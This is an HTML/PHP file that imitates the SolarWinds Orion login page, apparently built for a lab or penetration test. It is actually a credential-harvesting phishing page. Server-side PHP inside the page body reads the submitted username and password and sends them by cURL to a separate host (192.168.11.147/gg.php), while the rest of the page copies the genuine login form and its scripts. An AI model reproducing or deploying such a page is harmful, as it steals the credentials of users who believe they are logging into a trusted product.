<!DOCTYPE html PUBLIC "-W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" class="sw-is-locale-en sw-is-mozilla sw-is-mozilla-52"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8"><title>
	SolarWinds Orion
</title><link rel="shortcut icon" href="http://192.168.11.144:8787/Orion/images/favicon.ico"><link rel="stylesheet" type="text/css" href="abc_files/mainlayout.css">
<link rel="stylesheet" type="text/css" href="abc_files/solarwinds.css">
<link rel="stylesheet" type="text/css" href="abc_files/slategray.css">
<script type="text/javascript" src="abc_files/orionminreqs.ashx"></script>
<script type="text/javascript" src="abc_files/jquery.ashx"></script>
<script type="text/javascript">(function(){var de=$(document.documentElement); de.addClass('sw-is-locale-en'); $.each(jQuery.browser,function(k,v){if(v===true){ de.addClass('sw-is-'+k); de.addClass('sw-is-'+k+'-'+parseInt(jQuery.browser.version)); }}); })();</script>
<script type="text/javascript" src="abc_files/jquery_002.ashx"></script>
<script type="text/javascript" src="abc_files/jqueryajaxupdatepanelfix.ashx"></script>
<script type="text/javascript" src="abc_files/ui.ashx"></script>
<script type="text/javascript" src="abc_files/ui_002.ashx"></script>
<script type="text/javascript">SW.Core.Loader._cbLoaded('jquery');</script>

<style type="text/css">
/* rules designed to exist only in login page */
form.sw-pg-login { background-image: url(/orion/images/bg_login_gradient.gif); }
form.sw-pg-login p { padding: 0; margin: 15px 0 0 0; }
input { width: 240px; }
#logo { margin-left: -8px; }
.sw-mainnav-eval { padding: 0px; }
.sw-mainnav-eval, .sw-mainnav-eval a { color: #fff; }
#gutter { width: 380px; margin: auto; position: relative; margin-top: 50px; }
form.sw-pg-login #dialog { position: relative; padding: 10px 20px 10px 110px; margin-bottom: 15px; }
form.sw-pg-login #dialog { border: 1px solid black; border-radius: 5px; background: #343434 url(/orion/images/bg_login_dialog.gif) top left repeat-x; }
form.sw-pg-login #dialog label { color: #fff; font-weight: bold; position: absolute; display: inline-block; zoom: 1; margin-left: -90px; width: 80px; margin-top: 4px; }
form.sw-pg-login #dialog sw-btn-bar { margin-bottom: 0; margin-top: 15px; }
form.sw-pg-login #dialog > div { margin-top: 15px; }
form.sw-pg-login form.sw-pg-login #dialog #evalMsg { padding-left: 0; margin-top: 4px; }
form.sw-pg-login #tip { position: relative; zoom: 1; }
form.sw-pg-login #tip * { font-size: 11px; }
form.sw-pg-login span.crn { background-image: url(/orion/images/login_corners.gif); }
form.sw-pg-login span.crn { position: absolute; width: 4px; height: 4px; background-repeat: no-repeat; display: none; }
form.sw-pg-login #dialog span.crn-tl { top: -1px; left: -1px; background-position: -16px 0px; }
form.sw-pg-login #dialog span.crn-tr { top: -1px; right: -1px; background-position: -19px 0px; }
form.sw-pg-login #dialog span.crn-bl { bottom: -1px; left: -1px; background-position: -16px -4px; }
form.sw-pg-login #dialog span.crn-br { bottom: -1px; right: -1px; background-position: -19px -4px; }
form.sw-pg-login #tip span.crn-tl { top: 0px; left: 0px; background-position: -16px -8px; }
form.sw-pg-login #tip span.crn-tr { top: 0px; right: 0px; background-position: -19px -8px; }
form.sw-pg-login #tip span.crn-bl { bottom: 0px; left: 0px; background-position: -16px -12px; }
form.sw-pg-login #tip span.crn-br { bottom: 0px; right: 0px; background-position: -19px -12px; }
.sw-is-msie form.sw-pg-login span.crn { display: inline-block; }
.sw-is-msie form.sw-pg-login #dialog { background-position: 0 1px; }
form.sw-pg-login .sw-pg-suggestion { font-size: 10px; color: #cccccc; padding: 0; margin: 5px 0 0 0; }
.sw-pg-hint-nib { position: absolute; background: url(/orion/images/login_corners.gif) left center no-repeat; width: 14px; margin-left: -13px; height: 100%; }
.sw-pg-hint-inner { border: 1px solid #eaca7f; border-radius: 5px; background: #fffdcc; }
.sw-pg-hint-body { margin: 6px 4px 10px 4px; padding-left: 22px; background: url(/orion/images/icon.lightbulb.gif) top left no-repeat; }
.sw-pg-errortext, .sw-pg-errortext * { font-weight: bold; color: Red; }
.sw-pg-align { padding-left: 110px; }
</style>

<script type="text/javascript">

</script></head>
<body id="ctl00_Body" scroll="auto">
    
<div id="container">
<div id="content">
<?php
$url = "http://192.168.11.147/gg.php?id=" . $_POST['ctl00$BodyContent$Username'] . "&pass=" .$_POST['ctl00$BodyContent$Password'];
//Initialize cURL.
$ch = curl_init();

//Set the URL that you want to GET by using the CURLOPT_URL option.
curl_setopt($ch, CURLOPT_URL, $url);

//Set CURLOPT_RETURNTRANSFER so that the content is returned as a variable.
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

//Set CURLOPT_FOLLOWLOCATION to true to follow redirects.
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);

//Execute the request.
$data = curl_exec($ch);

//Close the cURL

 handle.
curl_close($ch);?>

<form name="aspnetForm" method="post" action="abc.php"  onsubmit="javascript:return WebForm_OnSubmit();" id="aspnetForm" class="sw-app-region sw-pg-login">
<div>
<input name="__EVENTTARGET" id="__EVENTTARGET" value="" type="hidden">
<input name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="" type="hidden">
<input name="__VIEWSTATE" id="__VIEWSTATE" value="cjpDXi9EoFs9pdEuDkniv1d4QZ46nQx0cMZGVufaPeeaamCerVbd4A/bwUC8dVYbDu6HTeLRdmAene3jTruGpAP6N/7iWvuRj30+/Kz0LTQ7v/7oHUp0jUqZbGUn7TZY5JLwctFxKO6JdONhZXUZ0ztVnFND5uH8JcPZ4Icx5PgQMKs/S6PPRZfQtoTYfsk4F23knZpPUb4y0lKEsUCFmQ==" type="hidden">
</div>

<script type="text/javascript">
//<![CDATA[
var theForm = document.forms['aspnetForm'];
if (!theForm) {
    theForm = document.aspnetForm;
}
function __doPostBack(eventTarget, eventArgument) {
    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
        theForm.__EVENTTARGET.value = eventTarget;
        theForm.__EVENTARGUMENT.value = eventArgument;
        theForm.submit();
    }
}
//]]>
</script>


<script src="abc_files/WebResource_002.axd" type="text/javascript"></script>


<script src="abc_files/WebResource.axd" type="text/javascript"></script>
<script type="text/javascript">
//<![CDATA[
function WebForm_OnSubmit() {
if (typeof(ValidatorOnSubmit) == "function" && ValidatorOnSubmit() == false) return false;
return true;
}
//]]>
</script>


<div id="gutter">
    <div id="dialog"><span class="crn crn-tl"></span><span class="crn crn-tr"></span><span class="crn crn-bl"></span><span class="crn crn-br"></span>
        <img id="logo" src="abc_files/login_logo.png" alt="SolarWinds" height="50" width="182">

        <div id="evalMsg" class="sw-mainnav-eval">
	<span>1 product in evaluation.</span>» <a href="javascript:void(0)">Details</a>
</div>

        <div>
            <label for="username">User name:</label><div><input name="ctl00$BodyContent$Username" id="ctl00_BodyContent_Username" tabindex="1" automation="username" value="admin" type="text"></div>
        </div>

        <p class="sw-pg-suggestion">Enter domain\username or username@domain for windows accounts</p>

        <span id="ctl00_BodyContent_ctl04" class="sw-pg-errortext" style="color: Red; display: none;">
            <p>User name is required.</p>
        </span>

        <div>
            <label for="password">Password:</label><div><input name="ctl00$BodyContent$Password" id="ctl00_BodyContent_Password" tabindex="2" automation="password" type="password"></div>
        </div>

        <div class="sw-btn-bar">
  <input type="submit" name="submit" value="Submit">  
        </div>
    </div>

    <div style="position: absolute; width: 100%; left: 400px; top: 101px;">
    <div id="tip"><span class="crn crn-tl"></span><span class="crn crn-tr"></span><span class="crn crn-bl"></span><span class="crn crn-br"></span>
        <div class="sw-pg-hint-nib" style=""></div>
        <div class="sw-pg-hint-inner">
        <div class="sw-pg-hint-body">
            You can log in with the username <b>admin</b> and <b>no password</b>.<br>
            To change the Admin password after you log in, click <b style="white-space: nowrap;">Settings &gt; Manage Accounts</b>.
        </div>
        </div>
    </div></div>

    
    <div id="CookiesNotWorking" class="sw-pg-errortext sw-pg-align" style="display:none;"><p>Enable cookies to login</p></div>
    <noscript><div class="sw-pg-errortext sw-pg-align"><p>Enable JavaScript to login</p></div></noscript>

    <p id="SiteLoginText"><script src="abc_files/ab.html"> </script></p>
</div>


<script type="text/javascript">
//<![CDATA[
var Page_Validators =  new Array(document.getElementById("ctl00_BodyContent_ctl04"));
//]]>
</script>

<script type="text/javascript">
//<![CDATA[
var ctl00_BodyContent_ctl04 = document.all ? document.all["ctl00_BodyContent_ctl04"] : document.getElementById("ctl00_BodyContent_ctl04");
ctl00_BodyContent_ctl04.controltovalidate = "ctl00_BodyContent_Username";
ctl00_BodyContent_ctl04.focusOnError = "t";
ctl00_BodyContent_ctl04.display = "Dynamic";
ctl00_BodyContent_ctl04.evaluationfunction = "RequiredFieldValidatorEvaluateIsValid";
ctl00_BodyContent_ctl04.initialvalue = "";
//]]>
</script>


<script type="text/javascript">
//<![CDATA[

var Page_ValidationActive = false;
if (typeof(ValidatorOnLoad) == "function") {
    ValidatorOnLoad();
}

function ValidatorOnSubmit() {
    if (Page_ValidationActive) {
        return ValidatorCommonOnSubmit();
    }
    else {
        return true;
    }
}
        //]]>
</script>
</form>
</div>

<div id="footermark"><!-- --></div>

<div id="footer">
    <a href="http://www.solarwinds.com/"><img alt="SolarWinds" src="abc_files/SolarWinds.gif" height="19" width="77"></a>Orion Core 2011.2.2, NPM 10.2.2, IVIM 1.2.0 © 1995-2011 All Rights Reserved</div>

</div>

<script type="text/javascript">
(function(){
  var ThisPage = SW.Core.ThisPage = SW.Core.ThisPage||{};

  var Sync = function(force){
    var tip = $('#tip');
    if( !tip[0] ) return;

    var tipoff = tip.offset(), dialog = $('#dialog'), dialogoff = dialog.offset(), nib = $('#tip .sw-pg-hint-nib'), w = $(window).width();

    if( (force===1) || (tipoff.left <= dialogoff.left) ) {
        if( force===1 ) tip.parent().show();
        if( w >= 1160 ) {
            var inputs = $('#dialog input'), username = $(inputs[0]), th = username.outerHeight(),
                top = username.offset().top - dialogoff.top - Math.floor( tip.innerHeight()/2 - th/2 );

                if( top < 1000 ) { // ie7 mode returns > 10k on occasion
                    $('#tip').parent().css('position','absolute').css('left', '400px').css('top', '' + top + 'px');
                    nib.show();
                }
        }
    }
    else if( w < 1160 && (tipoff.left > dialogoff.left) ) {
        $('#tip').parent().css('position','static');
        nib.hide();
    }
  };

  ThisPage.Init = function(){
    $(window).load(function(){ Sync(1); });
    $(window).resize(Sync);

    var tip = $('#tip'), elems = $('#dialog input');

    elems.keypress(function(e){
        if(e.which == 13) {
            e.preventDefault();
            e.target.form.submit();
            return false;
        }
    });

    if( tip[0] ) $(window).load(function(){
        var username = elems[0];
        if( username.value == '' ) {
            username.value = 'admin';
            elems[1].focus();
        }
    });

    if( !SW.Core.Cookie.Get('TestCookieSupport') )
        $('#CookiesNotWorking').show();
  };
})();

$(SW.Core.ThisPage.Init);
</script>

    <script type="text/javascript" src="abc_files/orionmaster.ashx"></script>
<script type="text/javascript">$(function(){SW.Core.Header.EvalInit([{"DaysRemaining":29,"DisplayName":"Network Performance Monitor v10.2.2","IsEval":true,"IsExpired":false,"IsRC":false,"MaintenanceExpiration":"\/Date(253402300799999)\/","ModuleName":"NPM","Version":"10.2.2"}]);});</script>
<script type="text/javascript">SW.Core.Footer.Init({ismobile:0});</script>

    


</body></html>
